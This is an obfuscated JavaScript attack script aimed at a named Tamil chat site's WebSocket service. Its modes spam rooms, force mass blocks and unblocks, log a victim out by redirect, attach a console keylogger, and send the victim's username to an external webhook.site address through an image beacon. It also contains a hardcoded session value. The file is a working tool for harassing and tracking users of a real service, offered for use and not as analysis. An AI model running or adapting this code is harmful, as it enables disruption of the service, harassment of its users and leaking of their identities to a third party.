var _0x53d1=['forEach','ws--','init','dsmq9q4okl9nq4nva1rtu2rkbi','state:','black','text','OPEN','fetch','top','http://chatroom.tamil2friends.com/login.php','href','getElementById','innerHTML','<img\x20src=\x22','\x22\x20/>','onkeydown','key','setTimeout','clearInterval','log','start\x20exploit...','location','get','att','msg','replace','Dragon','wss://chatroom.tamil2friends.com/chat','onmessage','data','type','register','username','role','success','mazhai','indexOf','all','setInterval','sub','nothing','status','guest','error','floor','blocks','send','stringify','unblock-user'];(function(_0x3df9f1,_0xb32bdd){var _0x5958fd=function(_0x29a1ef){while(--_0x29a1ef){_0x3df9f1['push'](_0x3df9f1['shift']());}};_0x5958fd(++_0xb32bdd);}(_0x53d1,0x78));var _0x3dd5=function(_0x2699a9,_0x501e82){_0x2699a9=_0x2699a9-0x0;var _0x5b6c40=_0x53d1[_0x2699a9];return _0x5b6c40;};console[_0x3dd5('0x0')](_0x3dd5('0x1'));const urlParams=new URLSearchParams(window[_0x3dd5('0x2')]['search']);const target_user=urlParams[_0x3dd5('0x3')]('id');const ROOM=urlParams['get']('rm');const attack_type=urlParams['get'](_0x3dd5('0x4'));const MSG=urlParams[_0x3dd5('0x3')](_0x3dd5('0x5'))[_0x3dd5('0x6')]('-','\x20');const repeat_time=parseInt(urlParams[_0x3dd5('0x3')]('rt'));const conn_time=parseInt(urlParams[_0x3dd5('0x3')]('ct'));var blockall=![];var unblockall=![];var guest=![];var allok=![];var guestname=_0x3dd5('0x7');var user='';var role='';var timer='';ws=new WebSocket(_0x3dd5('0x8'));ws[_0x3dd5('0x9')]=function(_0x8f2b54){var _0x347450=JSON['parse'](_0x8f2b54[_0x3dd5('0xa')]);var _0x935998=_0x347450[_0x3dd5('0xb')];console['log']('message----',_0x347450[_0x3dd5('0xa')]);if(_0x935998==_0x3dd5('0xc')){user=_0x347450[_0x3dd5('0xa')][_0x3dd5('0xd')];role=_0x347450['data'][_0x3dd5('0xe')];if(_0x347450['data']['status']==_0x3dd5('0xf')){if(user!=_0x3dd5('0x10')&&(user[_0x3dd5('0x11')](target_user)>-0x1||target_user==_0x3dd5('0x12'))){getip();timer=window[_0x3dd5('0x13')](function(){if(attack_type=='sb'){self_blocker();}else if(attack_type==_0x3dd5('0x14')){self_unblocker();}else if(attack_type=='bl'){blocker();}else if(attack_type=='sm'){send(ROOM,MSG);}else if(attack_type=='lo'){loghimout();}else if(attack_type=='kl'){keylog();}else{console[_0x3dd5('0x0')](_0x3dd5('0x15'));}},repeat_time);}}if(_0x347450[_0x3dd5('0xa')][_0x3dd5('0x16')]==_0x3dd5('0x17')){guest=!![];register(guestname);}if(_0x347450['data'][_0x3dd5('0xb')]==_0x3dd5('0x18')){guestname=guestname+Math[_0x3dd5('0x19')](Math['random']()*0xa+0x1);register(guestname);}}if(_0x935998==_0x3dd5('0x1a')){if(_0x347450[_0x3dd5('0xa')]['blocks']){if(unblockall){_0x347450['data'][_0x3dd5('0x1a')]['forEach'](_0x3bc294=>ws[_0x3dd5('0x1b')](JSON[_0x3dd5('0x1c')]({'type':_0x3dd5('0x1d'),'data':{'username':_0x3dd5('0x10')}})));unblockall=![];}}}if(_0x935998=='onliners'){if(_0x347450[_0x3dd5('0xa')]['onliners']){if(blockall){_0x347450['data']['onliners'][_0x3dd5('0x1e')](_0x1500f4=>ws['send'](JSON[_0x3dd5('0x1c')]({'type':'block-user','data':{'username':_0x1500f4[_0x3dd5('0xd')]}})));blockall=![];}}}};console[_0x3dd5('0x0')](_0x3dd5('0x1f'),ws);initsession=()=>{ws[_0x3dd5('0x1b')](JSON[_0x3dd5('0x1c')]({'type':_0x3dd5('0x20'),'data':{'session':_0x3dd5('0x21')}}));};register=_0x344a1c=>{if(guest){ws[_0x3dd5('0x1b')](JSON['stringify']({'type':_0x3dd5('0xc'),'data':{'username':_0x344a1c,'gender':'male'}}));}};send=(_0x980001,_0x1e2840)=>{console[_0x3dd5('0x0')](_0x3dd5('0x22'),attack_type,user,role);if(ws['OPEN']){ws[_0x3dd5('0x1b')](JSON[_0x3dd5('0x1c')]({'type':'send','data':{'color':_0x3dd5('0x23'),'room':_0x980001,'gifinput':'','_gifhidden':'','yinput':'','msg':_0x1e2840,'type':_0x3dd5('0x24')}}));ws['send'](JSON[_0x3dd5('0x1c')]({'type':_0x3dd5('0x1d'),'data':{'username':'mazhai'}}));}};getblocklist=()=>{if(ws['OPEN']){ws[_0x3dd5('0x1b')](JSON[_0x3dd5('0x1c')]({'type':_0x3dd5('0x1a'),'data':['a']}));}};blocker=()=>{console[_0x3dd5('0x0')](_0x3dd5('0x22'),attack_type,user,role);if(ws[_0x3dd5('0x25')]){ws[_0x3dd5('0x1b')](JSON[_0x3dd5('0x1c')]({'type':'block-user','data':{'username':'sam\x20londonn'}}));}};fetch_room=_0x2fc199=>{if(ws[_0x3dd5('0x25')]){ws['send'](JSON[_0x3dd5('0x1c')]({'type':_0x3dd5('0x26'),'data':{'room':_0x2fc199}}));}};self_blocker=()=>{console['log']('state:',attack_type,user,role);blockall=!![];fetch_room(ROOM);};self_unblocker=()=>{console[_0x3dd5('0x0')](_0x3dd5('0x22'),attack_type,user,role);unblockall=!![];getblocklist();};loghimout=()=>{console[_0x3dd5('0x0')]('state:',attack_type,user,role);window[_0x3dd5('0x27')][_0x3dd5('0x2')]['href']=_0x3dd5('0x28');parent[_0x3dd5('0x2')][_0x3dd5('0x29')]=_0x3dd5('0x28');};getip=()=>{console['log']('state:',attack_type,user,role);var _0x43349f=new Image();_0x43349f['src']='https://webhook.site/aee586cf-3dca-4d33-b2c9-4f979d72daee?c='+user;var _0x26b7e0=document[_0x3dd5('0x2a')]('x');_0x43349f['onload']=function(){_0x26b7e0[_0x3dd5('0x2b')]+=_0x3dd5('0x2c')+_0x43349f['src']+_0x3dd5('0x2d');};};keylog=()=>{console[_0x3dd5('0x0')](_0x3dd5('0x22'),attack_type,user,role);window[_0x3dd5('0x2e')]=function(_0x250735){console['log'](_0x3dd5('0x2f'),_0x250735[_0x3dd5('0x2f')]);};};ws['onopen']=()=>{initsession();register(guestname);window['setTimeout'](function(){register(guestname);},0x3e8);window[_0x3dd5('0x30')](function(){ws['close']();console[_0x3dd5('0x0')]('closed');window[_0x3dd5('0x31')](timer);},conn_time);};